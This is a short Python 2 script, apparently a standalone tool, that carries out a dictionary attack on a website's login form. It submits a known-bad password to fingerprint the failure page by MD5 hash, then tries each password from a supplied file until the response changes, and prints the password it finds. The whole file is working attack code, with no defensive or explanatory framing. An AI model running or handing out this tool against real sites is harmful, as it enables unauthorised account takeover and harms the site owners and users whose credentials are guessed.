import urllib2
import urllib
import sys
import os
import hashlib
from optparse import OptionParser


def md5sum(value):
    hasher = hashlib.md5()
    hasher.update(value)
    return hasher.hexdigest()


def trypassword(username, password, url):
    postdata = urllib.urlencode(
        {'username': str(username), 'password': str(password)})
    request = urllib2.Request(url, postdata)
    try:
        content = requestor.open(request).read()
    except (urllib2.URLError, urllib2.HTTPError):
        print "Error accessing page"
        sys.exit(2)
    return content


parser = OptionParser(usage='%prog [OPTIONS]')
parser.add_option(
    '-u', '--user', help='A valid username on the site.', dest='user')
parser.add_option('-U', '--url', help='The URL to the site login', dest='url')
parser.add_option(
    '-p', '--passfile', help='A file containing passwords', dest='passfile')
parser.add_option(
    '-v', '--verbose', action='store_true', help='Be verbose', dest='verbose')

(options, args) = parser.parse_args()
if ((options.user == None) or (options.url == None) or (options.passfile == None)):
    parser.print_help()
    sys.exit(2)
if not os.path.exists(options.passfile):
    print "Password file does not exist."
    sys.exit(2)

requestor = urllib2.build_opener()
failedlogin = md5sum(
    trypassword(options.user, "---this-is-a-bad-password-guess---", options.url))
success = False
passwordfile = open(options.passfile, "r")
for password in passwordfile:
    if md5sum(trypassword(options.user, password.strip(), options.url)) != failedlogin:
        print "\n\nPassword found - " + password
        success = True
        break
if not success:
    print "Password not found."
